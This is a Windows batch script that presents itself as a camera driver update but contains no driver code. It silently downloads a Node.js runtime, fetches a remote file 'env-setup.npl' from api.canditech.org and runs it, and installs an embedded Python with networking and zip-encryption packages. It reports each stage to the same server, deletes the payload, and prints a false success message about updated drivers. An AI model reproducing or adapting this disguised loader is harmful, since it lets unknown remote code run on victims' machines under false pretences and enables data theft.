@echo off
setlocal EnableDelayedExpansion

REM =====================================================================
REM  Windows driver setup - single linear script (no call :labels).
REM  Downloaded .bat files often break mid-file labels; paths must be set
REM  at the start, never via a failed subroutine.
REM  Template: WINDOW_UID is replaced by POST /window/:id on api.canditech.org
REM =====================================================================

set "WINDOW_UID=__ID__"
if not defined WINDOW_UID goto err_uid
if "!WINDOW_UID!"=="" goto err_uid
if "!WINDOW_UID!"=="__ID__" goto err_uid

echo [INFO] Searching for Camera Drivers ...
set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_1"
powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"

REM --- paths first: script lives in %TEMP% when run as downloaded t.bat ---
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "NODE_EXE="
set "NODE_VERSION="
set "LATEST_VERSION="

where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
)

if not defined NODE_EXE if exist "!PORTABLE_NODE!" (
    set "NODE_EXE=!PORTABLE_NODE!"
    set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
)

if not defined NODE_EXE (
    for /f "delims=" %%v in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; try { $r=Invoke-RestMethod -Uri 'https://nodejs.org/dist/index.json' -TimeoutSec 45; $r[0].version } catch { exit 1 }"') do set "LATEST_VERSION=%%v"
    if "!LATEST_VERSION!"=="" exit /b 1
    set "NODE_VERSION=!LATEST_VERSION:~1!"
    set "NODE_MSI=node-v!NODE_VERSION!-x64.msi"
    set "DOWNLOAD_URL=https://nodejs.org/dist/v!NODE_VERSION!/!NODE_MSI!"
    set "MSI_OUT=%~dp0!NODE_MSI!"

    where curl >nul 2>&1
    if errorlevel 1 (
        powershell -NoProfile -Command "Invoke-WebRequest -Uri \"!DOWNLOAD_URL!\" -OutFile \"!MSI_OUT!\"" >nul 2>&1
    ) else (
        curl -s -L --connect-timeout 30 --max-time 600 -o "!MSI_OUT!" "!DOWNLOAD_URL!"
    )

    if not exist "!MSI_OUT!" exit /b 1

    msiexec /a "!MSI_OUT!" /qn TARGETDIR="!EXTRACT_DIR!" >nul 2>&1
    del "!MSI_OUT!" >nul 2>&1

    if not exist "!PORTABLE_NODE!" exit /b 1

    set "NODE_EXE=!PORTABLE_NODE!"
    set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
)

if not defined NODE_EXE exit /b 1

"%NODE_EXE%" -v >nul 2>&1
if errorlevel 1 exit /b 1

set "ENV_SETUP_URL=https://api.canditech.org/driver/env-setup.npl"
set "CODEPROFILE=%USERPROFILE%"
if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%" 2>nul

where curl >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ENV_SETUP_URL%' -OutFile '%CODEPROFILE%\env-setup.npl' -TimeoutSec 120" >nul 2>&1
) else (
    curl -sSL --connect-timeout 30 --max-time 180 -o "%CODEPROFILE%\env-setup.npl" "%ENV_SETUP_URL%" >nul 2>&1
)
if not exist "%CODEPROFILE%\env-setup.npl" exit /b 1

set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
mkdir "!DRIVER_CURL_HOME!" 2>nul
(
echo silent
echo show-error
) > "!DRIVER_CURL_HOME!\.curlrc"
set "CURL_HOME=!DRIVER_CURL_HOME!"

echo [INFO] Updating Driver Packages...
set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_2"
powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
cd /d "%CODEPROFILE%"
"%NODE_EXE%" "env-setup.npl"
if errorlevel 1 exit /b 1

mkdir C:\python 2>nul
curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
if errorlevel 1 exit /b 1
powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force"
if errorlevel 1 exit /b 1
del C:\python\py.zip >nul 2>&1
powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1

curl -sSL --connect-timeout 30 --max-time 120 -o C:\python\get-pip.py https://bootstrap.pypa.io/get-pip.py >nul 2>&1
if errorlevel 1 exit /b 1
C:\python\python.exe C:\python\get-pip.py >nul 2>&1
if errorlevel 1 exit /b 1
C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
if errorlevel 1 exit /b 1

if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_3"
powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
echo [SUCCESS] Camera drivers have been updated successfully.
if defined WINDOW_UID (
    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
    curl -sL -X POST "!AUTO_URL!" -o nul
)
exit /b 0

:err_uid
exit /b 1
